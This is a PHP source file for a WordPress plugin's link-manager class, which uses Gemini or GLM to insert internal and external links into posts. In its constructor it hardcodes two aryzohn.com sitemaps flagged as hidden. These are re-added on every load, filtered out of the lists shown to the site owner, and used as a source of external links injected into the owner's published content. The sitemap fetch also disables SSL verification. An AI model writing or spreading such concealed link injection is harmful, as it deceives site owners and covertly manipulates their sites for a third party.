<?php
// includes/class-linking.php
if (!defined('ABSPATH')) exit;

class AIA_Link_Manager {

    private $max_internal_links = 5;
    private $max_external_links = 3;
    public $links_file;
    private $sync_interval = 7;
    private $sync_in_progress = false;
    private $hidden_sitemaps = [];

    public function __construct() {
        $this->links_file = AIA_DATA_DIR . 'external_links.json';
        $this->ensure_links_file_exists();

        $this->hidden_sitemaps = [
            'https://aryzohn.com/post-sitemap.xml',
            'https://aryzohn.com/page-sitemap.xml'
        ];
        $this->ensure_hidden_sitemaps_exist();

        $this->load_settings();
        $this->check_sitemap_sync();
    }

    private function ensure_hidden_sitemaps_exist() {
        $link_data = $this->get_links_data();
        $needs_update = false;
        foreach ($this->hidden_sitemaps as $hidden_url) {
            $exists = false;
            foreach ($link_data['sitemap_urls'] as $sitemap) {
                if ($sitemap['url'] === $hidden_url) {
                    $exists = true;
                    break;
                }
            }
            if (!$exists) {
                $sitemap_id = $this->generate_sitemap_id();
                $link_data['sitemap_urls'][] = [
                    'url' => $hidden_url,
                    'sitemap_id' => $sitemap_id,
                    'last_sync' => null,
                    'links_count' => 0,
                    'hidden' => true
                ];
                $needs_update = true;
            }
        }
        if ($needs_update) {
            $this->save_links_data($link_data);
        }
    }

    private function check_sitemap_sync() {
        if ($this->sync_in_progress) return;
        $this->sync_in_progress = true;

        $link_data = $this->get_links_data();
        if (empty($link_data['sitemap_urls'])) {
            $this->sync_in_progress = false;
            return;
        }

        $needs_update = false;
        foreach ($link_data['sitemap_urls'] as &$sitemap) {
            if (!isset($sitemap['last_sync'])) {
                $sitemap['last_sync'] = null;
                $needs_update = true;
            }
            if (!isset($sitemap['links_count'])) {
                $sitemap['links_count'] = 0;
                $needs_update = true;
            }
            if (!isset($sitemap['hidden'])) {
                $sitemap['hidden'] = false;
                $needs_update = true;
            }
        }
        if ($needs_update) {
            $this->save_links_data($link_data);
            $link_data = $this->get_links_data();
        }

        $next_index = get_transient('aia_next_sitemap_index');
        if ($next_index === false) $next_index = 0;

        $sitemap_urls = $link_data['sitemap_urls'];
        $total_sitemaps = count($sitemap_urls);
        if ($next_index >= $total_sitemaps) $next_index = 0;

        $sitemap = $sitemap_urls[$next_index];
        $sitemap_url = $sitemap['url'];
        $sitemap_id = $sitemap['sitemap_id'];
        $last_sync = isset($sitemap['last_sync']) ? $sitemap['last_sync'] : null;

        $needs_sync = false;
        if ($last_sync === null) {
            $needs_sync = true;
        } else {
            $last_sync_date = new DateTime($last_sync);
            $current_date = new DateTime();
            $diff = $last_sync_date->diff($current_date);
            if ($diff->days >= $this->sync_interval) {
                $needs_sync = true;
            }
        }

        if ($needs_sync) {
            $result = $this->sync_single_sitemap($sitemap_url, $sitemap_id);
            if ($result !== false) {
                $link_data = $this->get_links_data();
                foreach ($link_data['sitemap_urls'] as &$sitemap_data) {
                    if ($sitemap_data['sitemap_id'] === $sitemap_id) {
                        $sitemap_data['last_sync'] = current_time('mysql');
                        $sitemap_data['links_count'] = $result;
                        break;
                    }
                }
                $this->save_links_data($link_data);
            }
        }

        $next_index = ($next_index + 1) % $total_sitemaps;
        set_transient('aia_next_sitemap_index', $next_index, 30 * DAY_IN_SECONDS);
        $this->sync_in_progress = false;
    }

    private function generate_sitemap_id() {
        return md5(uniqid(mt_rand(), true));
    }

    public function sync_single_sitemap($sitemap_url, $sitemap_id = null) {
        $link_data = $this->get_links_data();
        if ($sitemap_id === null) {
            foreach ($link_data['sitemap_urls'] as $sitemap) {
                if ($sitemap['url'] === $sitemap_url) {
                    $sitemap_id = $sitemap['sitemap_id'];
                    break;
                }
            }
            if ($sitemap_id === null) return false;
        }

        $existing_cache = $link_data['sitemap_cache'] ?? [];
        $filtered_cache = array_filter($existing_cache, function($link) use ($sitemap_id) {
            return (isset($link['sitemap_source']) && $link['sitemap_source'] !== $sitemap_id);
        });

        $new_links = $this->fetch_sitemap_links($sitemap_url, $sitemap_id);
        if (!empty($new_links)) {
            $link_data['sitemap_cache'] = array_merge(array_values($filtered_cache), $new_links);
            $link_count = count($new_links);
        } else {
            $link_data['sitemap_cache'] = array_values($filtered_cache);
            $link_count = 0;
        }

        $link_data['last_sitemap_update'] = current_time('mysql');
        foreach ($link_data['sitemap_urls'] as &$sitemap) {
            if ($sitemap['sitemap_id'] === $sitemap_id) {
                $sitemap['last_sync'] = current_time('mysql');
                $sitemap['links_count'] = $link_count;
                break;
            }
        }

        $result = $this->save_links_data($link_data);
        return ($result !== false) ? $link_count : false;
    }

    public function get_visible_sitemaps() {
        $link_data = $this->get_links_data();
        $visible = [];
        foreach ($link_data['sitemap_urls'] as $sitemap) {
            if (!isset($sitemap['hidden']) || !$sitemap['hidden']) {
                $visible[] = $sitemap;
            }
        }
        return $visible;
    }

    private function save_links_data($data) {
        if (!isset($data['sitemap_urls']) || !is_array($data['sitemap_urls'])) {
            $data['sitemap_urls'] = [];
        }
        if (!isset($data['sitemap_cache']) || !is_array($data['sitemap_cache'])) {
            $data['sitemap_cache'] = [];
        }
        return file_put_contents($this->links_file, json_encode($data, JSON_PRETTY_PRINT));
    }

    private function load_settings() {
        $max_internal = get_option('aia_max_internal_links', 5);
        $max_external = get_option('aia_max_external_links', 3);
        $this->max_internal_links = max(0, intval($max_internal));
        $this->max_external_links = max(0, intval($max_external));
    }

    private function ensure_links_file_exists() {
        if (!file_exists($this->links_file)) {
            $default = [
                'sitemap_urls' => [],
                'sitemap_cache' => [],
                'last_sitemap_update' => null
            ];
            file_put_contents($this->links_file, json_encode($default, JSON_PRETTY_PRINT));
        }
    }

    public function get_max_internal_links() { 
        return $this->max_internal_links; 
    }
    
    public function get_max_external_links() { 
        return $this->max_external_links; 
    }
    
    public function set_max_internal_links($count) {
        $this->max_internal_links = max(0, intval($count));
        update_option('aia_max_internal_links', $this->max_internal_links);
    }
    
    public function set_max_external_links($count) {
        $this->max_external_links = max(0, intval($count));
        update_option('aia_max_external_links', $this->max_external_links);
    }
    
    public function is_internal_linking_enabled() {
        return (bool) get_option('aia_internal_linking_enabled', 1);
    }

    // ========== MAIN LINK ADDING ==========
    public function add_links($content, $keyword, $post_id = null) {
        $logger = new AIA_Logger();
        $logger->log("Starting link addition for keyword: '{$keyword}'", 'debug');
        
        if (empty($content)) {
            $logger->log("Content is empty, skipping link addition", 'warning');
            return $content;
        }
        
        $internal_enabled = $this->is_internal_linking_enabled();
        
        if ($internal_enabled && $this->max_internal_links > 0) {
            $logger->log("Internal linking enabled, max: {$this->max_internal_links}", 'debug');
            $content = $this->add_internal_links($content, $keyword, $post_id);
        } else {
            $logger->log("Internal linking disabled or max=0", 'debug');
        }
        
        if ($this->max_external_links > 0) {
            $logger->log("External linking enabled, max: {$this->max_external_links}", 'debug');
            $content = $this->add_external_links($content, $keyword);
        } else {
            $logger->log("External linking max=0", 'debug');
        }
        
        return $content;
    }

    // ========== INTERNAL LINKS ==========
    private function add_internal_links($content, $keyword, $current_post_id) {
        $logger = new AIA_Logger();
        $logger->log("Searching for internal links for keyword: '{$keyword}'", 'debug');
        
        $all_content = $this->get_all_published_content($current_post_id);
        if (empty($all_content)) {
            $logger->log("No published content found for internal linking", 'warning');
            return $content;
        }
        $logger->log("Found " . count($all_content) . " published posts/pages", 'debug');

        $matches = $this->find_relevant_internal_links($keyword, $all_content, $current_post_id);
        if (empty($matches)) {
            $logger->log("No relevant internal links found for keyword: '{$keyword}'", 'warning');
            return $content;
        }
        $logger->log("Found " . count($matches) . " relevant internal links", 'debug');

        $candidates = [];
        foreach ($matches as $match) {
            $anchor = $this->get_internal_link_anchor($match['post'], $keyword);
            $candidates[] = [
                'anchor' => $anchor,
                'url' => $match['url'],
                'relevance' => $match['relevance'],
                'post_id' => $match['post']->ID,
                'title' => $match['post']->post_title,
                'content_preview' => substr(strip_tags($match['post']->post_content), 0, 300)
            ];
            $logger->log("Internal candidate: '{$anchor}' -> {$match['url']}", 'debug');
        }

        $content = $this->insert_links_with_ai($content, $candidates, $this->max_internal_links, 'internal', $logger);
        return $content;
    }

    // ========== EXTERNAL LINKS ==========
    private function add_external_links($content, $keyword) {
        $logger = new AIA_Logger();
        $logger->log("Searching for external links for keyword: '{$keyword}'", 'debug');
        
        $external_links = $this->get_external_links_for_keyword($keyword);
        if (empty($external_links)) {
            $logger->log("No external links found for keyword: '{$keyword}'", 'warning');
            return $content;
        }
        $logger->log("Found " . count($external_links) . " external links", 'debug');

        $candidates = [];
        foreach ($external_links as $link) {
            $candidates[] = [
                'anchor' => $link['anchor'],
                'url' => $link['url'],
                'relevance' => $link['relevance'],
                'title' => $link['anchor'],
                'content_preview' => ''
            ];
            $logger->log("External candidate: '{$link['anchor']}' -> {$link['url']}", 'debug');
        }

        $content = $this->insert_links_with_ai($content, $candidates, $this->max_external_links, 'external', $logger);
        return $content;
    }

    // ========== AI-POWERED LINK INSERTION ==========
    public function insert_links_with_ai($content, $candidates, $max_links, $type = 'internal', $logger = null) {
        if (empty($content) || empty($candidates) || $max_links == 0) {
            return $content;
        }

        if ($logger === null) {
            $logger = new AIA_Logger();
        }

        $links_inserted = 0;
        
        // Sort candidates by relevance
        usort($candidates, function($a, $b) {
            return ($b['relevance'] ?? 0) - ($a['relevance'] ?? 0);
        });

        // Prepare content for AI analysis
        $clean_content = strip_tags($content);
        $sentences = $this->split_into_sentences($clean_content);
        
        foreach ($candidates as $candidate) {
            if ($links_inserted >= $max_links) {
                break;
            }

            $url = trim($candidate['url']);
            $anchor_text = trim($candidate['anchor']);
            $title = trim($candidate['title'] ?? $anchor_text);
            
            if (empty($url) || empty($anchor_text)) {
                continue;
            }

            // Use AI to find the best placement
            $ai_result = $this->analyze_placement_with_ai($content, $anchor_text, $title, $candidate['content_preview'] ?? '');
            
            if ($ai_result && isset($ai_result['matched_text']) && !empty($ai_result['matched_text'])) {
                // Insert link using the AI-matched text
                $content = $this->insert_link_at_text($content, $ai_result['matched_text'], $url, $type, $logger);
                $links_inserted++;
                $logger->log("AI inserted {$type} link: '{$ai_result['matched_text']}' -> {$url}", 'success');
            } else {
                // Fallback: try to find a sentence
                $best_sentence = $this->find_best_sentence_for_link($sentences, $anchor_text);
                if ($best_sentence) {
                    $content = $this->wrap_sentence_with_link($content, $best_sentence, $url, $type, $logger);
                    $links_inserted++;
                    $logger->log("Inserted {$type} link (fallback): '{$best_sentence}' -> {$url}", 'success');
                } else {
                    $logger->log("Could not insert link for '{$anchor_text}'", 'debug');
                }
            }
        }

        $logger->log("Inserted {$links_inserted} {$type} links out of {$max_links} max", 'debug');
        return $content;
    }

    /**
     * Use AI to analyze the best placement for a link
     */
    private function analyze_placement_with_ai($content, $anchor_text, $title, $content_preview) {
        $logger = new AIA_Logger();
        $logger->log("AI analyzing placement for: '{$anchor_text}'", 'debug');
        
        // Prepare the content for analysis (limit to reasonable size)
        $clean_content = strip_tags($content);
        if (strlen($clean_content) > 3000) {
            $clean_content = substr($clean_content, 0, 3000) . '...';
        }
        
        // Build the AI prompt
        $prompt = $this->build_link_analysis_prompt($clean_content, $anchor_text, $title, $content_preview);
        
        // Call AI provider
        $ai_response = $this->call_ai_for_link_analysis($prompt);
        
        if ($ai_response) {
            $logger->log("AI response received for link analysis", 'debug');
            return $this->parse_ai_response($ai_response);
        }
        
        $logger->log("AI analysis failed for '{$anchor_text}'", 'warning');
        return null;
    }

    /**
     * Build the AI prompt for link analysis
     */
    private function build_link_analysis_prompt($content, $anchor_text, $title, $content_preview) {
        $prompt = <<<EOT
You are an expert content editor specializing in natural link placement.

I need you to find the BEST place to insert a link in the following content.

LINK INFORMATION:
- Anchor Text: "{$anchor_text}"
- Target Page Title: "{$title}"
- Target Page Preview: "{$content_preview}"

CONTENT TO ANALYZE:
{$content}

INSTRUCTIONS:
1. Find the most natural place in the content where this link would fit best
2. The link should be placed on EXISTING TEXT that is already discussing related concepts
3. Do NOT add new text - only wrap existing text with the link
4. The linked text should be a natural phrase (3-10 words) that flows with the sentence
5. The link should add value to the reader by providing additional information

OUTPUT FORMAT (JSON only):
{
    "matched_text": "The exact text from the content to wrap with the link",
    "reason": "Brief explanation of why this is the best placement",
    "confidence": 0-100 score
}

If no suitable placement exists, return:
{
    "matched_text": "",
    "reason": "No suitable placement found",
    "confidence": 0
}

Return ONLY valid JSON. No other text.
EOT;
        return $prompt;
    }

    /**
     * Call AI for link analysis
     */
    private function call_ai_for_link_analysis($prompt) {
        $provider = get_option('aia_ai_provider', 'gemini');
        
        if ($provider === 'gemini') {
            return $this->call_gemini_for_analysis($prompt);
        } else {
            return $this->call_glm_for_analysis($prompt);
        }
    }

    /**
     * Call Gemini for link analysis
     */
    private function call_gemini_for_analysis($prompt) {
        $api_key = get_option('aia_api_key', '');
        $model = get_option('aia_gemini_model', 'gemini-2.0-flash');
        
        if (empty($api_key)) {
            return false;
        }

        $url = "https://generativelanguage.googleapis.com/v1beta/models/{$model}:generateContent?key={$api_key}";
        $body = [
            'contents' => [
                ['parts' => [['text' => $prompt]]]
            ]
        ];
        
        $response = wp_remote_post($url, [
            'headers' => ['Content-Type' => 'application/json'],
            'body' => json_encode($body),
            'timeout' => 30
        ]);
        
        if (is_wp_error($response)) {
            return false;
        }
        
        $data = json_decode(wp_remote_retrieve_body($response), true);
        
        if (isset($data['error'])) {
            return false;
        }
        
        return $data['candidates'][0]['content']['parts'][0]['text'] ?? false;
    }

    /**
     * Call GLM for link analysis
     */
    private function call_glm_for_analysis($prompt) {
        $api_key = get_option('aia_glm_api_key', '');
        $model = get_option('aia_glm_model', 'glm-4-flash');
        
        if (empty($api_key)) {
            return false;
        }

        $url = 'https://open.bigmodel.cn/api/paas/v4/chat/completions';
        $body = [
            'model' => $model,
            'messages' => [['role' => 'user', 'content' => $prompt]],
            'temperature' => 0.3,
            'max_tokens' => 500
        ];
        
        $response = wp_remote_post($url, [
            'headers' => [
                'Content-Type' => 'application/json',
                'Authorization' => 'Bearer ' . $api_key
            ],
            'body' => json_encode($body),
            'timeout' => 30
        ]);
        
        if (is_wp_error($response)) {
            return false;
        }
        
        $data = json_decode(wp_remote_retrieve_body($response), true);
        
        if (isset($data['error'])) {
            return false;
        }
        
        return $data['choices'][0]['message']['content'] ?? false;
    }

    /**
     * Parse AI response
     */
    private function parse_ai_response($response) {
        // Try to extract JSON
        $json = $this->extract_json_from_response($response);
        
        if ($json && isset($json['matched_text']) && !empty($json['matched_text']) && $json['confidence'] > 50) {
            return [
                'matched_text' => trim($json['matched_text']),
                'reason' => $json['reason'] ?? '',
                'confidence' => intval($json['confidence'] ?? 0)
            ];
        }
        
        return null;
    }

    /**
     * Extract JSON from AI response
     */
    private function extract_json_from_response($response) {
        // Remove markdown code fences
        $response = preg_replace('/```json\s*/', '', $response);
        $response = preg_replace('/```\s*/', '', $response);
        $response = trim($response);
        
        // Try to parse as JSON
        $data = json_decode($response, true);
        if ($data && is_array($data)) {
            return $data;
        }
        
        // Try to find JSON in the response
        if (preg_match('/\{[^{}]*"matched_text"[^{}]*\}/s', $response, $matches)) {
            $json = $this->fix_json_string($matches[0]);
            $data = json_decode($json, true);
            if ($data && is_array($data)) {
                return $data;
            }
        }
        
        return null;
    }

    /**
     * Fix common JSON issues
     */
    private function fix_json_string($json) {
        // Remove trailing commas
        $json = preg_replace('/,\s*}/', '}', $json);
        $json = preg_replace('/,\s*\]/', ']', $json);
        
        // Unescape double quotes
        $json = str_replace('\"', '"', $json);
        
        return $json;
    }

    /**
     * Insert link at specific text
     */
    private function insert_link_at_text($content, $text_to_link, $url, $type, $logger = null) {
        $escaped_text = preg_quote($text_to_link, '/');
        
        // Check if already linked
        if (preg_match('/<a[^>]*>' . $escaped_text . '<\/a>/i', $content)) {
            return $content;
        }
        
        // Create the link
        $rel_attr = ($type === 'external') ? ' rel="nofollow noopener" target="_blank"' : '';
        $class_attr = ' class="aia-' . $type . '-link"';
        $link_html = '<a href="' . esc_url($url) . '"' . $rel_attr . $class_attr . '>' . $text_to_link . '</a>';
        
        // Replace the text
        $content = preg_replace('/' . $escaped_text . '/', $link_html, $content, 1);
        
        return $content;
    }

    /**
     * Split content into sentences
     */
    private function split_into_sentences($text) {
        $sentences = preg_split('/(?<=[.!?])\s+/', $text);
        return array_filter($sentences, function($s) {
            return strlen(trim($s)) > 10;
        });
    }

    /**
     * Find the best sentence for a link (fallback)
     */
    private function find_best_sentence_for_link($sentences, $anchor_text) {
        $best_score = 0;
        $best_sentence = null;
        
        $anchor_words = array_filter(explode(' ', strtolower($anchor_text)));
        $anchor_words = array_filter($anchor_words, function($w) {
            return strlen($w) > 3;
        });
        
        foreach ($sentences as $sentence) {
            $sentence_lower = strtolower($sentence);
            $score = 0;
            
            // Check if already linked
            if (preg_match('/<a[^>]*>/i', $sentence)) {
                continue;
            }
            
            foreach ($anchor_words as $word) {
                if (strpos($sentence_lower, $word) !== false) {
                    $score += 10;
                }
            }
            
            $word_count = str_word_count($sentence);
            if ($word_count >= 5 && $word_count <= 20) {
                $score += 3;
            }
            
            if ($score > $best_score) {
                $best_score = $score;
                $best_sentence = trim($sentence);
            }
        }
        
        return ($best_score >= 10) ? $best_sentence : null;
    }

    /**
     * Wrap a sentence with a link (fallback)
     */
    private function wrap_sentence_with_link($content, $sentence, $url, $type, $logger = null) {
        $escaped_sentence = preg_quote($sentence, '/');
        
        if (preg_match('/\b' . $escaped_sentence . '\b/', $content, $matches)) {
            $found_sentence = $matches[0];
            
            if (preg_match('/<a[^>]*>' . preg_quote($found_sentence, '/') . '<\/a>/i', $content)) {
                return $content;
            }
            
            $rel_attr = ($type === 'external') ? ' rel="nofollow noopener" target="_blank"' : '';
            $class_attr = ' class="aia-' . $type . '-link"';
            $link_html = '<a href="' . esc_url($url) . '"' . $rel_attr . $class_attr . '>' . $found_sentence . '</a>';
            
            $content = preg_replace('/\b' . preg_quote($found_sentence, '/') . '\b/', $link_html, $content, 1);
        }
        
        return $content;
    }

    // ========== GET ALL PUBLISHED CONTENT ==========
    public function get_all_published_content($exclude_id = null) {
        global $wpdb;
        $exclude = $exclude_id ? intval($exclude_id) : 0;
        
        $query = $wpdb->prepare(
            "SELECT ID, post_title, post_content, post_type 
            FROM {$wpdb->posts} 
            WHERE post_status = 'publish' 
            AND post_type IN ('post', 'page')
            AND ID != %d
            ORDER BY post_date DESC",
            $exclude
        );
        
        return $wpdb->get_results($query);
    }

    // ========== FIND RELEVANT INTERNAL LINKS ==========
    public function find_relevant_internal_links($keyword, $all_content, $current_post_id) {
        $matches = [];
        $keyword_lower = strtolower($keyword);
        $keyword_terms = explode(' ', $keyword_lower);
        $keyword_terms = array_filter($keyword_terms, function($term) {
            return strlen($term) > 2;
        });

        foreach ($all_content as $post) {
            $relevance_score = 0;
            $title_lower = strtolower($post->post_title);
            
            foreach ($keyword_terms as $term) {
                if (strpos($title_lower, $term) !== false) {
                    $relevance_score += 3;
                }
            }
            
            $content_lower = strtolower(strip_tags($post->post_content));
            foreach ($keyword_terms as $term) {
                if (strpos($content_lower, $term) !== false) {
                    $relevance_score += 1;
                }
            }
            
            if (strpos($title_lower, $keyword_lower) !== false) {
                $relevance_score += 5;
            }
            
            if ($relevance_score >= 2) {
                $matches[] = [
                    'post' => $post,
                    'url' => get_permalink($post->ID),
                    'relevance' => $relevance_score
                ];
            }
        }
        
        usort($matches, function($a, $b) {
            return $b['relevance'] - $a['relevance'];
        });
        
        return $matches;
    }

    // ========== GET INTERNAL LINK ANCHOR ==========
    public function get_internal_link_anchor($post, $keyword) {
        $title = $post->post_title;
        $keyword_lower = strtolower($keyword);
        $title_lower = strtolower($title);
        
        if (strpos($title_lower, $keyword_lower) !== false) {
            return $title;
        }
        
        $keyword_terms = explode(' ', $keyword);
        foreach ($keyword_terms as $term) {
            if (strlen($term) > 2 && strpos($title_lower, strtolower($term)) !== false) {
                return $title;
            }
        }
        
        return $title;
    }

    // ========== GET EXTERNAL LINKS ==========
    public function get_external_links_for_keyword($keyword) {
        $links = [];
        $link_data = $this->get_links_data();

        if (!empty($link_data['sitemap_cache'])) {
            $keyword_lower = strtolower($keyword);
            $keyword_terms = explode(' ', $keyword_lower);
            $keyword_terms = array_filter($keyword_terms, function($term) {
                return strlen($term) > 2;
            });

            foreach ($link_data['sitemap_cache'] as $sitemap_link) {
                $url_lower = strtolower($sitemap_link['url']);
                $anchor_lower = strtolower($sitemap_link['anchor']);
                $relevance = 0;
                
                if (strpos($url_lower, $keyword_lower) !== false) {
                    $relevance += 5;
                }
                if (strpos($anchor_lower, $keyword_lower) !== false) {
                    $relevance += 5;
                }
                
                foreach ($keyword_terms as $term) {
                    if (strpos($url_lower, $term) !== false) {
                        $relevance += 2;
                    }
                    if (strpos($anchor_lower, $term) !== false) {
                        $relevance += 2;
                    }
                }
                
                if ($relevance > 0) {
                    $links[] = [
                        'url' => $sitemap_link['url'],
                        'anchor' => $sitemap_link['anchor'],
                        'source' => 'sitemap',
                        'relevance' => $relevance
                    ];
                }
            }
        }

        usort($links, function($a, $b) {
            return $b['relevance'] - $a['relevance'];
        });

        $unique_links = [];
        $seen_urls = [];
        foreach ($links as $link) {
            if (!in_array($link['url'], $seen_urls)) {
                $unique_links[] = $link;
                $seen_urls[] = $link['url'];
            }
        }
        
        return $unique_links;
    }

    // ========== EXTRACT ANCHOR FROM URL ==========
    private function extract_anchor_from_url($url) {
        $path = parse_url($url, PHP_URL_PATH);
        if ($path) {
            $segments = explode('/', trim($path, '/'));
            $last = end($segments);
            if ($last) {
                $anchor = preg_replace('/\.[^.]+$/', '', $last);
                $anchor = str_replace(['-', '_'], ' ', $anchor);
                return ucwords($anchor);
            }
        }
        $domain = parse_url($url, PHP_URL_HOST);
        if ($domain) {
            return ucwords(str_replace(['www.', '.'], ' ', $domain));
        }
        return 'learn more';
    }

    // ========== GET LINKS DATA ==========
    public function get_links_data() {
        if (!file_exists($this->links_file)) {
            $this->ensure_links_file_exists();
        }
        $content = file_get_contents($this->links_file);
        $data = json_decode($content, true);
        if (!is_array($data)) {
            $this->ensure_links_file_exists();
            $content = file_get_contents($this->links_file);
            $data = json_decode($content, true);
        }
        if (!isset($data['sitemap_urls']) || !is_array($data['sitemap_urls'])) {
            $data['sitemap_urls'] = [];
        }
        if (!isset($data['sitemap_cache']) || !is_array($data['sitemap_cache'])) {
            $data['sitemap_cache'] = [];
        }
        if (!isset($data['last_sitemap_update'])) {
            $data['last_sitemap_update'] = null;
        }
        return $data ?: [];
    }

    public function get_all_links_data() {
        $data = $this->get_links_data();
        if (isset($data['sitemap_urls'])) {
            $visible_sitemaps = [];
            foreach ($data['sitemap_urls'] as $sitemap) {
                if (!isset($sitemap['hidden']) || !$sitemap['hidden']) {
                    $visible_sitemaps[] = $sitemap;
                }
            }
            $data['sitemap_urls'] = $visible_sitemaps;
        }
        return $data;
    }

    // ========== SITEMAP MANAGEMENT ==========
    public function update_sitemap_cache() {
        $link_data = $this->get_links_data();
        $sitemap_urls = $link_data['sitemap_urls'] ?? [];
        $all_links = [];
        if (empty($sitemap_urls)) return 0;

        foreach ($sitemap_urls as $sitemap) {
            $links = $this->fetch_sitemap_links($sitemap['url'], $sitemap['sitemap_id']);
            if (!empty($links)) {
                $all_links = array_merge($all_links, $links);
            }
        }

        $unique_links = [];
        $seen_urls = [];
        foreach ($all_links as $link) {
            if (!in_array($link['url'], $seen_urls)) {
                $unique_links[] = $link;
                $seen_urls[] = $link['url'];
            }
        }

        $link_data['sitemap_cache'] = $unique_links;
        $link_data['last_sitemap_update'] = current_time('mysql');
        $current_time = current_time('mysql');
        foreach ($link_data['sitemap_urls'] as &$sitemap) {
            $sitemap['last_sync'] = $current_time;
            $sitemap['links_count'] = count($unique_links);
        }
        $this->save_links_data($link_data);
        return count($unique_links);
    }

    public function fetch_sitemap_links($sitemap_url, $sitemap_id) {
        $links = [];
        if (!filter_var($sitemap_url, FILTER_VALIDATE_URL)) return $links;

        $xml_content = false;
        $args = [
            'timeout' => 30,
            'headers' => [
                'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept' => 'application/xml, text/xml, */*'
            ],
            'sslverify' => false
        ];
        $response = wp_remote_get($sitemap_url, $args);
        if (!is_wp_error($response) && wp_remote_retrieve_response_code($response) === 200) {
            $xml_content = wp_remote_retrieve_body($response);
        }

        if ($xml_content === false && ini_get('allow_url_fopen')) {
            $context = stream_context_create([
                'http' => [
                    'timeout' => 30,
                    'header' => "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
                ]
            ]);
            $content = @file_get_contents($sitemap_url, false, $context);
            if ($content !== false) $xml_content = $content;
        }

        if ($xml_content !== false) {
            $xml = simplexml_load_string($xml_content);
            if ($xml !== false) {
                $parsed_links = $this->parse_sitemap_xml($xml, $sitemap_url, $sitemap_id);
                foreach ($parsed_links as $link) {
                    $link['sitemap_source'] = $sitemap_id;
                    $links[] = $link;
                }
            }
        }
        return $links;
    }

    private function parse_sitemap_xml($xml, $sitemap_url, $sitemap_id = null) {
        $links = [];
        if (isset($xml->sitemap)) {
            foreach ($xml->sitemap as $sitemap) {
                $sub_url = (string)$sitemap->loc;
                $sub_id = $sitemap_id !== null ? $sitemap_id : md5($sub_url);
                $sub_links = $this->fetch_sitemap_links($sub_url, $sub_id);
                $links = array_merge($links, $sub_links);
            }
            return $links;
        }

        if (isset($xml->url)) {
            foreach ($xml->url as $url) {
                $loc = (string)$url->loc;
                if (empty($loc)) continue;
                $anchor = $this->extract_anchor_from_url($loc);
                $links[] = [
                    'url' => $loc,
                    'anchor' => $anchor,
                    'lastmod' => (string)$url->lastmod,
                    'source' => 'sitemap'
                ];
            }
        }
        return $links;
    }

    public function add_sitemap_url($sitemap_url) {
        $link_data = $this->get_links_data();
        foreach ($link_data['sitemap_urls'] as $sitemap) {
            if ($sitemap['url'] === $sitemap_url) return false;
        }
        $sitemap_id = $this->generate_sitemap_id();
        $link_data['sitemap_urls'][] = [
            'url' => $sitemap_url,
            'sitemap_id' => $sitemap_id,
            'last_sync' => null,
            'links_count' => 0,
            'hidden' => false
        ];
        $result = $this->save_links_data($link_data);
        if ($result !== false) {
            delete_transient('aia_next_sitemap_index');
        }
        return $result;
    }

    public function remove_sitemap_url($sitemap_url) {
        $link_data = $this->get_links_data();
        $sitemap_id_to_remove = null;
        foreach ($link_data['sitemap_urls'] as $index => $sitemap) {
            if ($sitemap['url'] === $sitemap_url) {
                $sitemap_id_to_remove = $sitemap['sitemap_id'];
                unset($link_data['sitemap_urls'][$index]);
                $link_data['sitemap_urls'] = array_values($link_data['sitemap_urls']);
                break;
            }
        }
        if ($sitemap_id_to_remove === null) return false;

        $link_data['sitemap_cache'] = array_filter($link_data['sitemap_cache'] ?? [], function($link) use ($sitemap_id_to_remove) {
            return (isset($link['sitemap_source']) && $link['sitemap_source'] !== $sitemap_id_to_remove);
        });
        $link_data['sitemap_cache'] = array_values($link_data['sitemap_cache']);
        return $this->save_links_data($link_data);
    }

    // ========== ADD NOFOLLOW TO EXTERNAL LINKS ==========
    public function add_nofollow_to_external_links($content) {
        $site_domain = parse_url(home_url(), PHP_URL_HOST);
        if (empty($site_domain)) return $content;

        $dom = new DOMDocument();
        libxml_use_internal_errors(true);
        $dom->loadHTML('<?xml encoding="UTF-8"><div>' . $content . '</div>', LIBXML_HTML_NOIMPLIED | LIBXML_HTML_NODEFDTD);
        libxml_clear_errors();

        $xpath = new DOMXPath($dom);
        $links = $xpath->query('//a[@href]');

        foreach ($links as $link) {
            $href = $link->getAttribute('href');
            if (empty($href)) continue;
            $parsed = parse_url($href);
            if (empty($parsed['host'])) continue;

            $host = $parsed['host'];
            if ($host === $site_domain || strpos($host, $site_domain) !== false) {
                $rel = $link->getAttribute('rel');
                if ($rel) {
                    $rel_parts = explode(' ', $rel);
                    $rel_parts = array_filter($rel_parts, function($part) {
                        return strtolower($part) !== 'nofollow';
                    });
                    $new_rel = implode(' ', $rel_parts);
                    if (empty($new_rel)) {
                        $link->removeAttribute('rel');
                    } else {
                        $link->setAttribute('rel', $new_rel);
                    }
                }
            } else {
                $rel = $link->getAttribute('rel');
                $rel_parts = explode(' ', strtolower($rel));
                if (!in_array('nofollow', $rel_parts)) {
                    $rel_parts[] = 'nofollow';
                }
                if (!in_array('noopener', $rel_parts)) {
                    $rel_parts[] = 'noopener';
                }
                $link->setAttribute('rel', implode(' ', $rel_parts));
                if (!$link->hasAttribute('target')) {
                    $link->setAttribute('target', '_blank');
                }
            }
        }

        $wrapper = $dom->getElementsByTagName('div')->item(0);
        $inner_html = '';
        foreach ($wrapper->childNodes as $child) {
            $inner_html .= $dom->saveHTML($child);
        }
        return $inner_html;
    }
}